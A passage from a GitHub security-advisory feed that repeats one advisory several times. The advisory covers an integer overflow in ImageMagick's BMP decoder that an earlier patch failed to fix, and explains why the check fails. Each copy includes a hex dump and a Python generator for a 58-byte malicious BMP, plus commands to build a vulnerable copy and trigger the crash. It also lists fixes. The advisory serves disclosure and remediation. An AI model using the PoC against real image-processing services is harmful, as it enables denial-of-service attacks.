    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-x86] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-AnyCPU] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
